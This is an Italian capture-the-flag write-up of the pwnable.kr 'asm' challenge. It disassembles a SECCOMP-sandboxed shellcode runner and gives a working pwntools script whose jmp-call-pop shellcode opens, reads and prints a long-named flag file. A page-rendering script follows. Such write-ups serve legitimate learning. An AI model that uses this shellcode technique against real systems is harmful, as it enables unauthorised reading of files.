@@@
ASM ~ HCF
@@@

;il binario asm aspetta in input una shellcode che successivamente esegue; l'obbiettivo è leggere la flag dal filesystem, ma il nomefile della flag è molto lungo e il codice assembly x64 viene successivamente eseguito in un ambiente sandbox SECCOMP. SECCOMP è un meccanismo di sicurezza del kernel Linux che permette di restringere le system call che un processo può eseguire.

;quando un processo è in modalità SECCOMP, può utilizzare solo un sottoinsieme limitato di syscall. Se tenta di eseguire una syscall non permessa, il kernel può:

;terminare il processo (modo più restrittivo).
;restituire un errore.
;inviare un segnale.
;permettere l'esecuzione (se configurato con filtri BPF, come in questo caso).

@@@
[0x00000b20]> s main
[0x00000d64]> pdf

mov r9d, 0
mov r8d, 0
mov ecx, 0x32
mov edx, 7
mov esi, 0x1000
mov edi, 0x41414000
call sym.imp.mmap
@@@

;mmap crea una pagina RWX all'indirizzo 0x41414000.
;0x32, flags(MAP_PRIVATE|MAP_ANONYMOUS)
;7, prot(PROT_READ|WRITE|EXEC)
;0x1000, size(4kb).

@@@
0x00000e0a mov qword [buf], rax
0x00000e0e mov rax, qword [buf]
0x00000e12 mov edx, 0x1000
0x00000e17 mov esi, 0x90
0x00000e1c mov rdi, rax
0x00000e1f call sym.imp.memset
@@@

;riempie l'intera pagina (4kb) con il byte 0x90, che in x86/x64 è l'istruzione nop (no operation). forse qui inizializza la memoria con il byte 0x90, probabilmente per creare una nop sled in cui inserire una shellcode.

@@@
lea rax, obj.stub
mov rdi, rax
call sym.imp.strlen
@@@

;calcola la lunghezza dell obj.stub.

@@@
[0x00000d64]> s obj.stub
[0x002020c0]> pd 15
@@@

;posizioniamo il cursore di radare2 su obj.stub e vediamo se si tratta di istruzioni assembly:

@@@
0x002020c0 xor rax, rax
0x002020c3 xor rbx, rbx
0x002020c6 xor rcx, rcx
0x002020c9 xor rdx, rdx
0x002020cc xor rsi, rsi
0x002020cf xor rdi, rdi
0x002020d2 xor rbp, rbp
0x002020d5 xor r8, r8
0x002020d8 xor r9, r9
0x002020db xor r10, r10
0x002020de xor r11, r11
0x002020e1 xor r12, r12
0x002020e4 xor r13, r13
0x002020e7 xor r14, r14
0x002020ea xor r15, r15
@@@

;è uno stub che serve ad azzerare tutti i registri.

@@@
mov rdx, rax
lea rcx, obj.stub
mov rsi, rcx
mov rdi, rax
call sym.imp.memcpy
@@@

;copia lo stub nella memoria allocata.

@@@
mov dword [var_ch], 0x2e
mov eax, dword [var_ch]
movsxd rdx, eax
mov rax, qword [buf]
add rax, rdx
mov edx, 0x3e8
mov rsi, rax
mov edi, 0
call sym.imp.read
@@@

;add rax, rdx, buf+0x2e.
;0x3e8, max 1000 bytes.
;legge la nostra shellcode e la scrive dopo lo stub (offset 0x2e, 46 byte, le istruzioni di azzeramento dei registri).

@@@
mov rax, qword [buf]
call rax
@@@

;esegue la shellcode.

@@@
[0x00000d64]> s sym.sandbox
[0x00000c50]> pdf

; var uint32_t var_8h @ rbp-0x8
0x00000c50 push rbp
0x00000c51 mov rbp, rsp
0x00000c54 sub rsp, 0x10
0x00000c58 mov edi, 0
0x00000c5d call sym.imp.seccomp_init
@@@

;inizializza seccomp in modalità whitelist.

@@@
...

0x00000c83 mov rax, qword [var_8h]
0x00000c87 mov ecx, 0
0x00000c8c mov edx, 2
0x00000c91 mov esi, 0x7fff0000
0x00000c96 mov rdi, rax
0x00000c99 mov eax, 0
0x00000c9e call sym.imp.seccomp_rule_add
@@@

;nella funzione ci sono tutta una serie di chiamate a seccomp_rule_add che definiscono quali syscall sono permesse; seccomp_rule_add aggiunge una regola che permette (mov esi, 0x7fff0000 ; action = SCMP_ACT_ALLOW) una specifica syscall.

;syscall permesse:

;read 0
;write 1
;open 2
;exit 60 (0x3c)
;exit_group 231 (0xe7)

;obiettivo

;leggere il contenuto del file con il nome lunghissimo:

@@@
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
@@@

;dato che il filename è troppo lungo per essere inserito direttamente nello shellcode come immediato, usiamo la tecnica jmp-call-pop:

;jmp a una label che contiene il filename.
;call torna indietro al codice principale (push rip sullo stack, che contiene l'indirizzo della stringa filename).
;pop recupera l'indirizzo del filename dallo stack.

;shellcode exploit

@@@
from pwn import *
context.arch = 'amd64'

r = remote('localhost', 9026)
r.recvuntil(b'shellcode: ')

shellcode = asm('''
jmp filename
back:

pop rdi
@@@

;recupera l'indirizzo del filename dallo stack.

@@@
xor rax, rax
mov al, 2
xor rsi, rsi
syscall
@@@

;sys_open(filename,O_RDONLY,0)

@@@
mov rdi, rax
xor rax, rax
sub rsp, 0x300
mov rsi, rsp
mov dx, 0x300
syscall
@@@

;sys_read(fd,buffer,size)
;ritorna bytes letti in rax.

@@@
mov rdx, rax
mov al, 1
mov dil, 1
syscall
@@@

;sys_write(stdout,buffer,size)

@@@
mov al, 60
xor rdi, rdi
syscall
@@@

;sys_exit(0)

@@@
filename:
call back
.ascii "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
.byte 0
''')

r.send(shellcode)
r.interactive()
@@@


;jmp-call-pop technique:

@@@
jmp filename
@@@

;salta alla fine della shellcode.

@@@
back:
pop rdi
@@@

;recupera l'indirizzo del filename.

@@@
....

filename:
call back
.ascii "file..."
@@@

;chiama back e push rip (indirizzo filename) sullo stack.

;syscall open()

@@@
xor rax, rax
mov al, 2
xor rsi, rsi
syscall
@@@

;rdi già contiene il puntatore al filename.
;syscall 2 per open.
;flags O_RDONLY=0
;rdx non serve per open.
;fd ritornato in rax.

;syscall read()

@@@
mov rdi, rax
xor rax, rax
sub rsp, 0x300
mov rsi, rsp
mov dx, 0x300
syscall
@@@

;fd del file.
;syscall number 0 (read).
;sub rsp, crea spazio sullo stack.
;in rsi l'indirizzo del buffer dove scrivere.
;in dx 0x300 dimensione massima.
;bytes letti in rax.

;syscall write()

@@@
mov rdx, rax
mov al, 1
mov dil, 1
syscall
@@@

;lunghezza da scrivere.
;syscall write.
;fd stdout.
;rsi già punta al buffer.

;syscall exit()

@@@
mov al, 60
xor rdi, rdi
syscall
@@@

;syscall exit.
;exit code 0.

;eseguendo lo script otteniamo la flag dal file con il nome estremamente lungo.

@@@
asm@ubuntu:~$ python /tmp/bz.py

@@@

<script>
(function(){
    const raw = document.getElementById('content').textContent;
    const lines = raw.split('\n');
    const output = document.getElementById('output');

    let html = '';
    let i = 0;

    // salta righe vuote iniziali
    while(i < lines.length && lines[i].trim() === '') i++;

    while(i < lines.length){
        const line = lines[i];

        // blocco article: da @@@ a @@@
        if(line.trim() === '@@@'){
            i++;
            let block = '';
            while(i < lines.length && lines[i].trim() !== '@@@'){
                block += lines[i] + '\n';
                i++;
            }
            i++; // salta il @@@ di chiusura
            html += `<div class="article">${escHtml(block.replace(/\n$/, ''))}</div>\n`;
            continue;
        }

        // raccoglie un blocco di testo (fino al prossimo @@@ o fine)
        let textLines = [];
        while(i < lines.length && lines[i].trim() !== '@@@'){
            textLines.push(lines[i]);
            i++;
        }

        // divide in paragrafi sulle righe vuote
        const paragraphs = splitParagraphs(textLines);
        if(paragraphs.length > 0){
            html += `<div class="commento">\n`;
            for(const p of paragraphs){
                //html += `<p>${p}</p>\n`;
	  	html += `<p>${p.replace(/\n/g, '<br>')}</p>\n`;
            }
            html += `</div>\n`;
        }
    }

    output.innerHTML = html;

    function splitParagraphs(lines){
        const result = [];
        let current = [];
        for(const line of lines){
            if(line.trim() === ''){
                if(current.length > 0){
                    result.push(current.join('\n'));
                    current = [];
                }
            } else {
                current.push(line);
            }
        }
        if(current.length > 0) result.push(current.join('\n'));
        return result;
    }

    function escHtml(str){
        return str
            .replace(/&/g,'&amp;')
            .replace(/</g,'&lt;')
            .replace(/>/g,'&gt;');
    }
})();
</script>
